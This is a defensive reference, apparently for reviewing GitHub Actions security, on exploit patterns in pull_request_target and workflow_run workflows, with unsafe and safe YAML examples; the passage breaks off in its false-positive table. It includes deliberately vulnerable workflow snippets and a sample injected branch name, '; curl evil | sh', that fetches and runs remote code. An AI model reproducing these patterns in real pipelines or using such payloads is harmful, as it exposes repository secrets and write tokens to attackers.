<!--
  Generated initially from spec.yaml; durable after that. Edit this
  reference directly to improve domain depth. Skillet regenerates
  only missing reference files.
-->

# pull_request_target and workflow_run exploit patterns

## When to use

Load this reference when the workflow under review uses `pull_request_target`, `workflow_run`, or otherwise consumes PR-head code, PR metadata, or artifacts produced by a fork/PR run inside a trusted context (target-repo secrets, write `GITHUB_TOKEN`, OIDC, self-hosted runner). These two triggers are the source of the highest-severity GHA exploit chains; treat them as guilty until traced to a safe pattern.

## Contents

1. Why these triggers are dangerous
2. Trust model cheat sheet
3. `pull_request_target` exploit patterns (`pwn_request`)
4. `workflow_run` exploit patterns (artifact and PR-data trust)
5. Safe patterns
6. Sinks to trace from PR-controlled content
7. False-positive traps
8. Reporting checklist

## 1. Why these triggers are dangerous

| Trigger | Runs in context of | Has secrets? | Token default | PR head code is... |
|---|---|---|---|---|
| `pull_request` | PR head | No (forks) | read | the checked-out code (expected) |
| `pull_request_target` | base ref of target repo | **Yes** | **read/write** | NOT checked out by default; explicit `ref:` makes it dangerous |
| `workflow_run` | default branch of target repo | **Yes** | **read/write** | NOT in scope; artifacts/PR metadata are the danger |

The exploit thesis: an attacker opens a PR (or pushes to a fork) and influences code, files, or metadata that a *privileged* job then executes, evaluates, or interpolates.

## 2. Trust model cheat sheet

Inside `pull_request_target` / `workflow_run`, treat as **attacker-controlled**:

- `github.event.pull_request.head.sha`, `head.ref`, `head.repo.*`
- `github.event.pull_request.title`, `body`, `labels[*].name`
- `github.event.pull_request.user.*`, `head.repo.owner.*`
- `github.head_ref` (PR branch name)
- Any file content fetched from the PR head ref or fork
- Any artifact uploaded by the triggering run (for `workflow_run`)
- Any cache key/content the PR run could populate

Treat as **trusted**:

- `github.event.pull_request.base.*`, `github.repository`, `github.sha` (in `workflow_run`, this is the SHA of the triggering workflow file on the default branch — but the *triggering run's* head SHA is attacker-controlled)
- `github.run_id`, `github.run_number`
- Files at the base ref / default branch checkout

## 3. `pull_request_target` exploit patterns

### 3.1 The canonical `pwn_request` — checkout of PR head, then run code

**Unsafe:**
```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← PR code
      - run: npm ci && npm test                           # ← executes PR code
```
Impact: full RCE with target repo's `GITHUB_TOKEN` and `secrets.*`. Any `package.json` script, `pyproject.toml` build hook, `Makefile`, `setup.py`, pre-commit hook, lint config, or codegen tool in the PR runs as the target.

Variants that are equally exploitable:

- `ref: refs/pull/${{ github.event.number }}/merge`
- `ref: ${{ github.event.pull_request.head.ref }}` with `repository: ${{ github.event.pull_request.head.repo.full_name }}`
- Sparse / partial checkout of PR — still pulls attacker files
- `git fetch` + `git checkout` of PR head in a manual `run:` step

### 3.2 Implicit code execution after PR checkout

The checkout itself is not the RCE; the next privileged step that *touches* the working tree is. All of these are sinks if they run after a PR-head checkout:

- `npm ci`, `npm install`, `yarn`, `pnpm install` (lifecycle scripts)
- `pip install -e .`, `pip install -r requirements.txt` (PEP 517 build, `setup.py`)
- `go generate`, `cargo build` with `build.rs`, `bundle install`
- `pre-commit run`, `tox`, `nox`
- `actions/setup-node` with a custom registry that runs `.npmrc`
- Any `uses: ./local-action` where the action lives in the PR
- `docker build` of a Dockerfile from the PR
- Test runners that load conftest, plugins, or fixtures from the PR

### 3.3 Reading PR metadata into shell

Even without checkout, `pull_request_target` grants secrets:
```yaml
- run: echo "Welcome ${{ github.event.pull_request.title }}"   # injection
```
Severity is the same as 3.1: shell-context RCE with full target privileges. See the expression-injection reference for sinks.

### 3.4 PR-controlled paths re-introduced via `path:` checkout

```yaml
- uses: actions/checkout@<sha>                  # base, looks safe
- uses: actions/checkout@<sha>
  with:
    ref: ${{ github.event.pull_request.head.sha }}
    path: pr                                    # PR code under ./pr
- run: ./pr/scripts/lint.sh                     # ← executes PR code
```
"Quarantining" PR code into a subdirectory is **not** a mitigation if anything later runs from it.

### 3.5 Label/assignee gating that doesn't actually gate

```yaml
on:
  pull_request_target:
    types: [labeled]
jobs:
  ci:
    if: github.event.label.name == 'safe-to-test'
    steps:
      - uses: actions/checkout@<sha>
        with: { ref: ${{ github.event.pull_request.head.sha }} }
      - run: npm test
```
Trap: the label gate runs once, but subsequent `synchronize` events on the same PR re-trigger the workflow with the label still applied. Attacker pushes new commits *after* the label is granted. Require either:
- re-checking author association at job start, or
- using the `pull_request` trigger and pulling the PR ref deliberately (no secrets), or
- a separate dispatch workflow that pins to a reviewed SHA.

## 4. `workflow_run` exploit patterns

`workflow_run` runs on the **default branch** of the target repo with full secrets and write token, regardless of where the triggering workflow ran. The triggering run's outputs are attacker-controlled if the triggering workflow ran on a fork PR.

### 4.1 Artifact poisoning

**Unsafe:**
```yaml
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
jobs:
  comment:
    permissions: { pull-requests: write }
    steps:
      - uses: actions/download-artifact@<sha>
        with:
          name: pr-info
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - run: |
          PR=$(cat pr-info/number.txt)
          BODY=$(cat pr-info/body.md)
          gh pr comment "$PR" --body "$BODY"     # body controlled by fork
```
The artifact was uploaded by a fork PR run; everything in it is attacker-controlled. Sinks:
- `cat`'d into shell (injection, depending on quoting)
- Passed to `actions/github-script` (JS sink — see expression-injection ref)
- Used as a file path (path traversal into checkout)
- Executed (`bash artifact/script.sh`)
- Decoded as JSON and fields interpolated into `run:`

### 4.2 PR number / SHA reflection

A common pattern is "find the PR that triggered this run, then act on it":
```yaml
- run: |
    PR_SHA=${{ github.event.workflow_run.head_sha }}      # attacker SHA
    PR_BRANCH=${{ github.event.workflow_run.head_branch }} # attacker branch name
```
`head_branch` is a string the attacker chose for their fork branch — it can contain `; curl evil | sh`, backticks, `$()`, etc. Always pass via `env:` and quote.

### 4.3 Checkout of the triggering run's head SHA

```yaml
- uses: actions/checkout@<sha>
  with:
    ref: ${{ github.event.workflow_run.head_sha }}   # PR head, in privileged ctx
- run: npm ci
```
This is `pwn_request` wearing a `workflow_run` hat. Same severity, same impact.

### 4.4 Conclusion check that doesn't conclude anything

```yaml
if: github.event.workflow_run.conclusion == 'success'
```
Does not protect against malicious code; the upstream workflow can succeed by design while still uploading attacker-controlled artifacts.

## 5. Safe patterns

### 5.1 Two-workflow split (recommended for "comment on PR with build results")

Workflow A (`pull_request`, no secrets) builds and uploads minimal, well-typed artifacts (e.g. just the PR number as a plain integer in a known-format file).

Workflow B (`workflow_run`, has secrets) downloads artifact, **validates** content shape strictly, and uses it only as data — never as code or shell input:

```yaml
- uses: actions/download-artifact@<sha>
  with: { name: pr-number, run-id: ${{ github.event.workflow_run.id }} }
- id: read
  run: |
    n=$(cat pr-number/n)
    [[ "$n" =~ ^[0-9]+$ ]] || { echo "bad pr number"; exit 1; }
    echo "pr=$n" >> "$GITHUB_OUTPUT"
- uses: actions/github-script@<sha>
  with:
    script: |
      const pr = parseInt(process.env.PR, 10);
      if (!Number.isFinite(pr)) throw new Error('bad pr');
      // ...use pr via API, never via shell
  env:
    PR: ${{ steps.read.outputs.pr }}
```

### 5.2 `pull_request_target` without checking out PR code

Legitimate uses: labeling, commenting, applying a stable script *from the base ref* that doesn't touch the PR working tree.

```yaml
on: pull_request_target
permissions: { pull-requests: write }   # narrow
jobs:
  label:
    steps:
      - uses: actions/checkout@<sha>           # base ref, no `ref:` override
      - run: ./.github/scripts/auto-label.sh "$PR_TITLE"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}   # via env, quoted
```
Then narrow `permissions:` to only what's needed and avoid touching anything from the PR.

### 5.3 Authorization gate before privileged action

```yaml
if: |
  github.event.pull_request.author_association == 'OWNER' ||
  github.event.pull_request.author_association == 'MEMBER' ||
  github.event.pull_request.author_association == 'COLLABORATOR'
```
Acceptable for chatops-style flows. Not sufficient on its own when the job also checks out PR code, because a member can still introduce a bug from a fork; combine with environment review or pin to a specific SHA.

### 5.4 Environments with required reviewers

Routing privileged jobs through a GitHub Environment with required reviewers turns the dispatch into a manual approval. Useful for "deploy this PR's preview" flows.

### 5.5 Pin everything reachable

In any workflow that may run in trusted context after touching PR data:
- All `uses:` pinned to a 40-char SHA
- Local actions read and reviewed
- Lockfiles installed with `--ignore-scripts` if the package manager supports it (npm `--ignore-scripts`, pnpm `--ignore-scripts`, yarn `--ignore-scripts`)
- Build steps disabled where possible (`pip install --no-build-isolation` is not a fix; PEP 517 still runs `setup.py`)

## 6. Sinks to trace from PR-controlled content

Once you've identified that PR-head content has reached the trusted job, every one of these is a sink:

- `run:` shell (injection or executes PR scripts)
- `actions/github-script` `script:` (JS eval)
- Lifecycle scripts in installed packages
- `setup.py`, `build.rs`, `Makefile` targets, `tox.ini` envs
- `pre-commit` hooks, `husky` hooks, `.git/hooks/*`
- `docker build` (Dockerfile RUNs in the privileged runner)
- `actions/setup-node` `registry-url:` plus PR-controlled `.npmrc`
- Custom local actions (`uses: ./...`) defined or modified in the PR
- Reusable workflows referenced by SHA from the PR ref
- `$GITHUB_ENV` / `$GITHUB_PATH` writes (see expression-injection ref)
- Cached restore that the PR populated (see runners reference)

## 7. False-positive traps

| Pattern | Verdict |
|---|---|
| `pull_request_target` with `actions/checkout` of **base** (no `ref:` override) and no use of `${{ github.event.pull_request.* }}` strings | Not exploitable on its own — check sinks anyway, but don't claim `pwn_request` |
| `workflow_run` that only reads `github.event.workflow_run.id` and `conclusion`, never downloads artifacts or PR metadata | Generally safe; verify no checkout of `head_sha` |
| `pull_request_target` reading `pull_request.title` via `env:` and using `"$TITLE"` quoted in shell | Mitigated; do not flag as expression injection. Still verify it isn't passed to a non-shell evaluator (github-script, eval) |
| Comment workflow that uses `pull_request_target` only to assign reviewers via API with `pull_request.user.login` (a GitHub-validated username, not free-form) | Username chars are constrained; treat as low/no risk in shell *if quoted*, but never trust as JS identifier |
| Two-workflow split where Workflow B downloads an artifact and uses it **only** as a typed/validated value through the API (no shell, no eval) | Safe pattern; do not flag |
| `if: github.event.pull_request
